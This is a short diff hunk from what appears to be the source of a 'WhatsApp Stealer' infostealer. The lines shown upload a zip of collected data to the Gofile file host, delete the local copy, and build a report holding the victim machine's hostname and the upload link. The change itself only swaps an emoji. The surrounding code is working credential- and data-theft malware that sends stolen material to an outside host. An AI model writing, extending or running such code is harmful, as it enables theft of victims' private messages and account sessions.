@@ -33,7 +33,7 @@ m = uploadToGofile(f"{os.getcwd()}\\ssouput.zip")
 os.remove(f"{os.getcwd()}\\ssouput.zip")
 
 message = f"**XPierroz WhatsApp Stealer Report**\n\n"
-message += f"📌 Pc: {socket.gethostname()}\n"
+message += f"🖥️ Pc: {socket.gethostname()}\n"
 message += f"📎 Url: {m}"
 
 payload = {
